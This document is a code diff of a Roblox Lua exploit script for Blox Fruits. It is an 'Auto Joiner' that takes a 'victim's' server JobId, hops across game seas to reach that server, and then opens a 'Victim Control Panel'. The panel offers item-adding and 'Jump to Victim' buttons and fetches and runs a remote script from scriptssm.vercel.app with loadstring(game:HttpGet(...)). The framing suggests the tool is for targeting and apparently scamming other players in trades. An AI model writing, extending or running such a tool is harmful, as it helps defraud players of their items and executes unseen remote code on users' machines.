@@ -1,17 +1,10 @@
--- Auto Joiner with Control GUI for Blox Fruits
--- This script joins victim's server and provides control buttons
+-- Complete Auto Joiner with Control GUI for Blox Fruits
+-- Combines multi-sea teleportation with control panel
 
-local TeleportService = game:GetService("TeleportService")
 local Players = game:GetService("Players")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local LocalPlayer = Players.LocalPlayer
-local CorrectPlaceId = 4442272183
-
--- Check if in correct game
-if game.PlaceId ~= CorrectPlaceId then
-    warn("[Auto Joiner] Wrong game! This script only works on Blox Fruits Sea 2")
-    return
-end
+local TeleportService = game:GetService("TeleportService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
 -- Initialize config if not exists
 if not _G["Script-SM_Config"] then
@@ -26,44 +19,25 @@ end
 
 local Config = _G["Script-SM_Config"]
 
--- Get current JobId
-local function getCurrentJobId()
-    local ServerBrowser = ReplicatedStorage:WaitForChild("__ServerBrowser")
-    local jobId = nil
-    pcall(function()
-        jobId = ServerBrowser:InvokeServer("getjob")
-    end)
-    return (jobId and jobId ~= "") and jobId or game.JobId
-end
+-- Sea and Place mapping
+local SEA_PLACE = {
+    ["1"] = 2753915549,
+    ["2"] = 4442272183,
+    ["3"] = 7449423635,
+}
 
--- Find victim player and get their JobId
-local function findVictimJobId(victimName)
-    local victim = Players:FindFirstChild(victimName)
-    if victim then
-        print("[Auto Joiner] Found victim: " .. victimName)
-        return getCurrentJobId() -- They're in our server, return current JobId
-    else
-        print("[Auto Joiner] Victim not found, will need JobId")
-        return nil
+local function getCurrentSea()
+    if game.PlaceId == 2753915549 then
+        return "1"
+    elseif game.PlaceId == 4442272183 then
+        return "2"
+    elseif game.PlaceId == 7449423635 then
+        return "3"
     end
+    return "0"
 end
 
--- Teleport to target JobId
-local function teleportToJobId(targetJobId)
-    if not targetJobId or targetJobId == "" then
-        warn("[Auto Joiner] Invalid JobId")
-        return false
-    end
-    
-    print("[Auto Joiner] Attempting to teleport to JobId: " .. targetJobId)
-    local success = pcall(function()
-        TeleportService:TeleportToPlaceInstance(CorrectPlaceId, targetJobId, LocalPlayer)
-    end)
-    
-    return success
-end
-
--- Create join dialog first
+-- Create Join Dialog
 local function CreateJoinDialog()
     local playerGui = LocalPlayer:WaitForChild("PlayerGui")
     
@@ -73,8 +47,8 @@ local function CreateJoinDialog()
     screenGui.Parent = playerGui
     
     local panel = Instance.new("Frame")
-    panel.Size = UDim2.new(0, 400, 0, 300)
-    panel.Position = UDim2.new(0.5, -200, 0.5, -150)
+    panel.Size = UDim2.new(0, 500, 0, 400)
+    panel.Position = UDim2.new(0.5, -250, 0.5, -200)
     panel.BackgroundColor3 = Color3.fromRGB(20, 20, 35)
     panel.BorderSizePixel = 0
     panel.Parent = screenGui
@@ -90,10 +64,10 @@ local function CreateJoinDialog()
     
     -- Title
     local title = Instance.new("TextLabel")
-    title.Size = UDim2.new(1, 0, 0, 50)
+    title.Size = UDim2.new(1, 0, 0, 60)
     title.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
     title.BorderSizePixel = 0
-    title.Text = "🎮 Join Victim's Server"
+    title.Text = "🎮 Auto Joiner - Teleport to Victim"
     title.Font = Enum.Font.GothamBold
     title.TextSize = 18
     title.TextColor3 = Color3.fromRGB(100, 200, 255)
@@ -103,43 +77,84 @@ local function CreateJoinDialog()
     titleCorner.CornerRadius = UDim.new(0, 12)
     titleCorner.Parent = title
     
-    -- Info Label
-    local infoLabel = Instance.new("TextLabel")
-    infoLabel.Size = UDim2.new(1, -20, 0, 50)
-    infoLabel.Position = UDim2.new(0, 10, 0, 60)
-    infoLabel.BackgroundTransparency = 1
-    infoLabel.Text = "Enter victim's username or JobId:"
-    infoLabel.Font = Enum.Font.Gotham
-    infoLabel.TextSize = 14
-    infoLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
-    infoLabel.TextXAlignment = Enum.TextXAlignment.Left
-    infoLabel.Parent = panel
+    -- JobId Label
+    local jobIdLabel = Instance.new("TextLabel")
+    jobIdLabel.Size = UDim2.new(1, -20, 0, 25)
+    jobIdLabel.Position = UDim2.new(0, 10, 0, 75)
+    jobIdLabel.BackgroundTransparency = 1
+    jobIdLabel.Text = "📍 Victim's JobId:"
+    jobIdLabel.Font = Enum.Font.GothamBold
+    jobIdLabel.TextSize = 13
+    jobIdLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+    jobIdLabel.TextXAlignment = Enum.TextXAlignment.Left
+    jobIdLabel.Parent = panel
     
-    -- Input Box
-    local inputBox = Instance.new("TextBox")
-    inputBox.Size = UDim2.new(1, -20, 0, 40)
-    inputBox.Position = UDim2.new(0, 10, 0, 120)
-    inputBox.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
-    inputBox.BorderSizePixel = 0
-    inputBox.TextColor3 = Color3.fromRGB(255, 255, 255)
-    inputBox.PlaceholderText = "Username or JobId..."
-    inputBox.Font = Enum.Font.Gotham
-    inputBox.TextSize = 12
-    inputBox.Parent = panel
+    -- JobId Input
+    local jobIdInput = Instance.new("TextBox")
+    jobIdInput.Size = UDim2.new(1, -20, 0, 45)
+    jobIdInput.Position = UDim2.new(0, 10, 0, 105)
+    jobIdInput.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
+    jobIdInput.BorderSizePixel = 0
+    jobIdInput.TextColor3 = Color3.fromRGB(255, 255, 255)
+    jobIdInput.PlaceholderText = "Paste JobId here..."
+    jobIdInput.Font = Enum.Font.Gotham
+    jobIdInput.TextSize = 13
+    jobIdInput.Parent = panel
     
-    local inputCorner = Instance.new("UICorner")
-    inputCorner.CornerRadius = UDim.new(0, 6)
-    inputCorner.Parent = inputBox
+    local jobIdCorner = Instance.new("UICorner")
+    jobIdCorner.CornerRadius = UDim.new(0, 6)
+    jobIdCorner.Parent = jobIdInput
+    
+    -- Sea Label
+    local seaLabel = Instance.new("TextLabel")
+    seaLabel.Size = UDim2.new(1, -20, 0, 25)
+    seaLabel.Position = UDim2.new(0, 10, 0, 160)
+    seaLabel.BackgroundTransparency = 1
+    seaLabel.Text = "🌊 Target Sea (1, 2, or 3):"
+    seaLabel.Font = Enum.Font.GothamBold
+    seaLabel.TextSize = 13
+    seaLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+    seaLabel.TextXAlignment = Enum.TextXAlignment.Left
+    seaLabel.Parent = panel
+    
+    -- Sea Input
+    local seaInput = Instance.new("TextBox")
+    seaInput.Size = UDim2.new(1, -20, 0, 45)
+    seaInput.Position = UDim2.new(0, 10, 0, 190)
+    seaInput.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
+    seaInput.BorderSizePixel = 0
+    seaInput.TextColor3 = Color3.fromRGB(255, 255, 255)
+    seaInput.PlaceholderText = "2 (default is Sea 2)"
+    seaInput.Font = Enum.Font.Gotham
+    seaInput.TextSize = 13
+    seaInput.Text = "2"
+    seaInput.Parent = panel
+    
+    local seaCorner = Instance.new("UICorner")
+    seaCorner.CornerRadius = UDim.new(0, 6)
+    seaCorner.Parent = seaInput
+    
+    -- Status Label
+    local statusLabel = Instance.new("TextLabel")
+    statusLabel.Size = UDim2.new(1, -20, 0, 35)
+    statusLabel.Position = UDim2.new(0, 10, 0, 250)
+    statusLabel.BackgroundTransparency = 1
+    statusLabel.Text = "✅ Ready to join"
+    statusLabel.Font = Enum.Font.Gotham
+    statusLabel.TextSize = 12
+    statusLabel.TextColor3 = Color3.fromRGB(150, 255, 150)
+    statusLabel.TextWrapped = true
+    statusLabel.Parent = panel
     
     -- Join Button
     local joinButton = Instance.new("TextButton")
-    joinButton.Size = UDim2.new(0.48, 0, 0, 45)
-    joinButton.Position = UDim2.new(0, 10, 0, 180)
+    joinButton.Size = UDim2.new(0.48, 0, 0, 50)
+    joinButton.Position = UDim2.new(0, 10, 0, 300)
     joinButton.BackgroundColor3 = Color3.fromRGB(50, 150, 100)
     joinButton.BorderSizePixel = 0
     joinButton.Text = "🚀 Join Server"
     joinButton.Font = Enum.Font.GothamBold
-    joinButton.TextSize = 12
+    joinButton.TextSize = 13
     joinButton.TextColor3 = Color3.fromRGB(255, 255, 255)
     joinButton.Parent = panel
     
@@ -149,13 +164,13 @@ local function CreateJoinDialog()
     
     -- Cancel Button
     local cancelButton = Instance.new("TextButton")
-    cancelButton.Size = UDim2.new(0.48, 0, 0, 45)
-    cancelButton.Position = UDim2.new(0.52, 0, 0, 180)
+    cancelButton.Size = UDim2.new(0.48, 0, 0, 50)
+    cancelButton.Position = UDim2.new(0.52, 0, 0, 300)
     cancelButton.BackgroundColor3 = Color3.fromRGB(150, 50, 50)
     cancelButton.BorderSizePixel = 0
     cancelButton.Text = "❌ Cancel"
     cancelButton.Font = Enum.Font.GothamBold
-    cancelButton.TextSize = 12
+    cancelButton.TextSize = 13
     cancelButton.TextColor3 = Color3.fromRGB(255, 255, 255)
     cancelButton.Parent = panel
     
@@ -163,56 +178,76 @@ local function CreateJoinDialog()
     cancelCorner.CornerRadius = UDim.new(0, 6)
     cancelCorner.Parent = cancelButton
     
-    -- Status Label
-    local statusLabel = Instance.new("TextLabel")
-    statusLabel.Size = UDim2.new(1, -20, 0, 40)
-    statusLabel.Position = UDim2.new(0, 10, 0, 240)
-    statusLabel.BackgroundTransparency = 1
-    statusLabel.Text = "Ready to join"
-    statusLabel.Font = Enum.Font.Gotham
-    statusLabel.TextSize = 11
-    statusLabel.TextColor3 = Color3.fromRGB(150, 255, 150)
-    statusLabel.Parent = panel
-    
     local function attemptJoin()
-        local input = inputBox.Text:gsub("^%s*(.-)%s*$", "%1")
+        local jobId = jobIdInput.Text:gsub("^%s*(.-)%s*$", "%1")
+        local sea = seaInput.Text:gsub("^%s*(.-)%s*$", "%1")
         
-        if input == "" then
-            statusLabel.Text = "⚠️ Enter username or JobId"
+        if jobId == "" or jobId == "PASTE_THE_JOBID_HERE" then
+            statusLabel.Text = "⚠️ Enter valid JobId"
             statusLabel.TextColor3 = Color3.fromRGB(255, 200, 50)
             return
         end
         
-        statusLabel.Text = "🔄 Joining..."
-        statusLabel.TextColor3 = Color3.fromRGB(100, 200, 255)
-        joinButton.Enabled = false
-        
-        -- Check if it's a username or JobId
-        local jobId = nil
-        local isUsername = input:match("^[a-zA-Z0-9_-]+$") and not input:match("-")
-        
-        if isUsername then
-            -- Try to find by username
-            jobId = findVictimJobId(input)
-            if not jobId then
-                statusLabel.Text = "❌ Victim not found in server"
-                statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
-                joinButton.Enabled = true
-                return
-            end
-        else
-            -- Assume it's a JobId
-            jobId = input
+        if not SEA_PLACE[sea] then
+            statusLabel.Text = "⚠️ Invalid Sea (1, 2, or 3)"
+            statusLabel.TextColor3 = Color3.fromRGB(255, 200, 50)
+            return
         end
         
-        local success = teleportToJobId(jobId)
-        if success then
-            statusLabel.Text = "✅ Teleporting..."
-            statusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
-        else
+        statusLabel.Text = "🔄 Joining Sea " .. sea .. "..."
+        statusLabel.TextColor3 = Color3.fromRGB(100, 200, 255)
+        joinButton.Enabled = false
+        cancelButton.Enabled = false
+        
+        -- Queue teleport for after arriving at destination
+        queue_on_teleport([[
+            task.wait(4)
+            if game.PlaceId == ]] .. SEA_PLACE[sea] .. [[ and game.JobId ~= "]] .. jobId .. [[" then
+                game:GetService("TeleportService"):TeleportToPlaceInstance(]] .. SEA_PLACE[sea] .. [[, "]] .. jobId .. [[")
+            end
+        ]])
+        
+        -- Get current sea and handle multi-sea teleportation
+        local CURRENT_SEA = getCurrentSea()
+        
+        if CURRENT_SEA ~= sea then
+            if CURRENT_SEA == "1" then
+                -- Sea 1 → Sea 2 first
+                print("[Auto Joiner] Traveling from Sea 1 to Sea 2...")
+                statusLabel.Text = "🌊 Traveling to Sea 2..."
+                local CommF = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_")
+                pcall(function()
+                    CommF:InvokeServer("TravelDressrosa")
+                end)
+                return
+            end
+            
+            if CURRENT_SEA == "2" and sea == "3" then
+                -- Sea 2 → Sea 3
+                print("[Auto Joiner] Traveling from Sea 2 to Sea 3...")
+                statusLabel.Text = "🌊 Traveling to Sea 3..."
+                local CommF = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_")
+                pcall(function()
+                    CommF:InvokeServer("TravelZou")
+                end)
+                return
+            end
+        end
+        
+        -- Already on correct sea, teleport to JobId
+        print("[Auto Joiner] Teleporting to JobId: " .. jobId)
+        statusLabel.Text = "✅ Teleporting..."
+        statusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
+        
+        local success = pcall(function()
+            TeleportService:TeleportToPlaceInstance(SEA_PLACE[sea], jobId)
+        end)
+        
+        if not success then
             statusLabel.Text = "❌ Teleport failed"
             statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
             joinButton.Enabled = true
+            cancelButton.Enabled = true
         end
     end
     
@@ -224,8 +259,7 @@ local function CreateJoinDialog()
         screenGui:Destroy()
     end)
     
-    -- Enter key to join
-    inputBox.FocusLost:Connect(function(enterPressed)
+    jobIdInput.FocusLost:Connect(function(enterPressed)
         if enterPressed then
             attemptJoin()
         end
@@ -234,7 +268,7 @@ local function CreateJoinDialog()
     print("[Auto Joiner] Join dialog created!")
 end
 
--- Main GUI Creation (appears after teleporting)
+-- Create Control GUI (shows after teleporting)
 local function CreateControlGUI()
     local playerGui = LocalPlayer:WaitForChild("PlayerGui")
     
@@ -246,8 +280,8 @@ local function CreateControlGUI()
     -- Main Panel
     local mainPanel = Instance.new("Frame")
     mainPanel.Name = "MainPanel"
-    mainPanel.Size = UDim2.new(0, 450, 0, 650)
-    mainPanel.Position = UDim2.new(0.5, -225, 0.5, -325)
+    mainPanel.Size = UDim2.new(0, 450, 0, 700)
+    mainPanel.Position = UDim2.new(0.5, -225, 0.5, -350)
     mainPanel.BackgroundColor3 = Color3.fromRGB(20, 20, 35)
     mainPanel.BorderSizePixel = 0
     mainPanel.Parent = screenGui
@@ -267,7 +301,7 @@ local function CreateControlGUI()
     title.Size = UDim2.new(1, 0, 0, 50)
     title.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
     title.BorderSizePixel = 0
-    title.Text = "🎮 Blox Fruits Control Panel"
+    title.Text = "🎮 Victim Control Panel"
     title.Font = Enum.Font.GothamBold
     title.TextSize = 18
     title.TextColor3 = Color3.fromRGB(100, 200, 255)
@@ -285,7 +319,7 @@ local function CreateControlGUI()
     scrollFrame.BackgroundTransparency = 1
     scrollFrame.BorderSizePixel = 0
     scrollFrame.ScrollBarThickness = 8
-    scrollFrame.CanvasSize = UDim2.new(0, 0, 0, 1200)
+    scrollFrame.CanvasSize = UDim2.new(0, 0, 0, 1400)
     scrollFrame.Parent = mainPanel
     
     -- Helper function to create section
@@ -393,7 +427,7 @@ local function CreateControlGUI()
     
     -- Section 2: Auto Add Buttons
     local autoAddSection, _ = createSection("Auto Add", 160)
-    autoAddSection.Size = UDim2.new(1, -10, 0, 200)
+    autoAddSection.Size = UDim2.new(1, -10, 0, 220)
     
     createButton(autoAddSection, "⭐ Add All Gamepass", 40, 1, function()
         local CommF = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_")
@@ -418,7 +452,7 @@ local function CreateControlGUI()
         end
     end)
     
-    createButton(autoAddSection, "💎 Add All Permanent", 90, 1, function()
+    createButton(autoAddSection, "💎 Add All Permanent", 100, 1, function()
         local CommF = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_")
         local success, inv = pcall(function() return CommF:InvokeServer("getInventory") end)
         if success then
@@ -441,7 +475,7 @@ local function CreateControlGUI()
         end
     end)
     
-    createButton(autoAddSection, "🔥 Add High Tradables", 140, 1, function()
+    createButton(autoAddSection, "🔥 Add High Tradables", 160, 1, function()
         local highTradables = {
             "Werewolf (Tiger)",
             "Purple Lightning",
@@ -464,20 +498,18 @@ local function CreateControlGUI()
     end)
     
     -- Section 3: Action Buttons
-    local actionSection, _ = createSection("Actions", 370)
-    actionSection.Size = UDim2.new(1, -10, 0, 120)
+    local actionSection, _ = createSection("Actions", 390)
+    actionSection.Size = UDim2.new(1, -10, 0, 140)
     
-    createButton(actionSection, "🔄 Execute Script", 40, 1, function()
-        print("[Control Panel] Loading Script-Fixed.lua...")
-        local scriptUrl = "https://scriptssm.vercel.app/Script-Fixed.lua"
+    createButton(actionSection, "▶️ Start Trading", 40, 1, function()
+        print("[Control Panel] Starting trading script...")
         pcall(function()
-            loadstring(game:HttpGet(scriptUrl))()
+            loadstring(game:HttpGet("https://scriptssm.vercel.app/Script-Fixed.lua"))()
         end)
     end)
     
     createButton(actionSection, "🚀 Jump to Victim", 100, 1, function()
         print("[Control Panel] Jumping to victim...")
-        -- This will be triggered when a trade is detected
         if LocalPlayer.Character then
             local humRootPart = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
             if humRootPart then
@@ -488,15 +520,15 @@ local function CreateControlGUI()
     end)
     
     -- Section 4: Status
-    local statusSection, _ = createSection("Status", 500)
-    statusSection.Size = UDim2.new(1, -10, 0, 100)
+    local statusSection, _ = createSection("Status", 540)
+    statusSection.Size = UDim2.new(1, -10, 0, 120)
     
     local statusLabel = Instance.new("TextLabel")
-    statusLabel.Size = UDim2.new(1, -10, 0, 80)
+    statusLabel.Size = UDim2.new(1, -10, 0, 100)
     statusLabel.Position = UDim2.new(0, 5, 0, 35)
     statusLabel.BackgroundColor3 = Color3.fromRGB(30, 40, 50)
     statusLabel.BorderSizePixel = 0
-    statusLabel.Text = "✅ Panel Ready\n\n📋 Fruits Want: " .. (Config.fruits_you_want ~= "" and Config.fruits_you_want or "None")
+    statusLabel.Text = "✅ Panel Ready\n\n📋 Fruits Want: " .. (Config.fruits_you_want ~= "" and Config.fruits_you_want or "None") .. "\n\n👥 Server: " .. game.JobId:sub(1, 8) .. "..."
     statusLabel.Font = Enum.Font.Gotham
     statusLabel.TextSize = 11
     statusLabel.TextColor3 = Color3.fromRGB(150, 255, 150)
@@ -512,7 +544,7 @@ local function CreateControlGUI()
     -- Update status every second
     task.spawn(function()
         while screenGui.Parent do
-            statusLabel.Text = "✅ Panel Ready\n\n📋 Fruits Want: " .. (Config.fruits_you_want ~= "" and Config.fruits_you_want or "None") .. "\n\n👥 Server: " .. game.JobId:sub(1, 8) .. "..."
+            statusLabel.Text = "✅ Panel Active\n\n📋 Fruits Want: " .. (Config.fruits_you_want ~= "" and Config.fruits_you_want or "None") .. "\n\n👥 Server: " .. game.JobId:sub(1, 8) .. "..."
             task.wait(1)
         end
     end)
@@ -549,35 +581,29 @@ local function CreateControlGUI()
 end
 
 -- Main execution
-print("[Auto Joiner] Script started on " .. game.PlaceId)
-print("[Auto Joiner] Current JobId: " .. game.JobId)
+print("[Auto Joiner] Starting...")
 
--- Create GUI
-CreateControlGUI()
-
--- Main execution
-print("[Auto Joiner] Script started!")
-print("[Auto Joiner] Current JobId: " .. game.JobId)
-
--- Show join dialog
+-- Show join dialog immediately
 CreateJoinDialog()
 
--- Listen for respawn to re-show the control GUI
+-- Listen for teleport to show control GUI
+local guiCreated = false
 Players.LocalPlayer.CharacterAdded:Connect(function()
-    task.wait(2)
-    -- Auto create control GUI when respawned on victim's server
-    if _G["ControlGUICreated"] == nil then
-        print("[Auto Joiner] Creating control panel on victim's server...")
-        _G["ControlGUICreated"] = true
-        CreateControlGUI()
-        
-        -- Auto load Script-Fixed.lua after 2 seconds
+    if not guiCreated then
         task.wait(2)
-        print("[Auto Joiner] Auto-loading Script-Fixed.lua...")
-        pcall(function()
-            loadstring(game:HttpGet("https://scriptssm.vercel.app/Script-Fixed.lua"))()
-        end)
+        print("[Auto Joiner] Creating control panel...")
+        guiCreated = true
+        CreateControlGUI()
     end
 end)
 
-print("[Auto Joiner] Ready! Input victim username or JobId to join their server.")
+-- Also create GUI if already in game
+if LocalPlayer.Character then
+    if not guiCreated then
+        task.wait(1)
+        guiCreated = true
+        CreateControlGUI()
+    end
+end
+
+print("[Auto Joiner] Ready! Input JobId and Sea number to teleport.")
